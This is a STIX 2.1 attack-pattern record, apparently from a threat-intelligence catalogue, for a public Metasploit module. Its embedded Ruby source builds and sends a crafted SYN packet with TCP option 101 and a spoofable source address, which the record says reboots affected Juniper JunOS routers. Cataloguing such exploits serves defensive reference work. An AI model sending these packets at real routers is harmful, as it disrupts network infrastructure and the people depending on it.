{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb5948a3-24d2-4abe-9812-3c9d4e25b8d8",
    "created": "2024-08-14T16:24:51.809902Z",
    "modified": "2024-08-14T16:24:51.809906Z",
    "name": "Juniper JunOS Malformed TCP Option",
    "description": "This module exploits a denial of service vulnerability in Juniper Network's JunOS router operating system. By sending a TCP packet with TCP option 101 set, an attacker can cause an affected router to reboot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/tcp/junos_tcp_opt.rb",
            "external_id": "junos_tcp_opt.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Capture\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super(\n      'Name'        => 'Juniper JunOS Malformed TCP Option',\n      'Description' => %q{ This module exploits a denial of service vulnerability\n        in Juniper Network's JunOS router operating system. By sending a TCP\n        packet with TCP option 101 set, an attacker can cause an affected\n        router to reboot.\n        },\n      'Author'      => 'todb',\n      'License'     => MSF_LICENSE,\n      'References' =>\n        [\n          ['BID', '37670'],\n          ['OSVDB', '61538'],\n          ['URL','http://praetorianprefect.com/archives/2010/01/junos-juniper-flaw-exposes-core-routers-to-kernal-crash/']\n        ]\n    )\n\n    register_options([\n      OptInt.new('RPORT', [false, 'The destination port (defaults to random)']),\n      OptInt.new('SPORT', [false, 'Source port (defaults to random)']),\n      OptAddress.new('SHOST', [false, 'Source address (defaults to random)'])\n    ])\n\n    deregister_options('FILTER','PCAPFILE', 'SNAPLEN')\n  end\n\n  def rport\n    datastore['RPORT'].to_i.zero? ? rand(0xffff) : datastore['RPORT'].to_i\n  end\n\n  def sport\n    datastore['SPORT'].to_i.zero? ? rand(0xffff) : datastore['SPORT'].to_i\n  end\n\n  def shost\n    datastore['SHOST'] || IPAddr.new(rand(0xffffffff), Socket::AF_INET).to_s\n  end\n\n  def run\n\n    open_pcap\n\n    p = PacketFu::TCPPacket.new\n    p.ip_daddr = rhost\n    p.ip_saddr = shost\n    p.ip_ttl = rand(128) + 128\n    p.tcp_sport = sport\n    p.tcp_dport = rport\n    p.tcp_flags.syn = 1\n    p.tcp_win = rand(4096)+1\n    p.tcp_opts = \"e\\x02\\x01\\x00\" # Opt 101, len 2, nop, eol\n    p.recalc\n    print_status(\"#{p.ip_daddr}:#{p.tcp_dport} Sending TCP Syn packet from #{p.ip_saddr}:#{p.tcp_sport}\")\n    capture_sendto(p,rhost)\n    close_pcap\n  end\nend\n"
}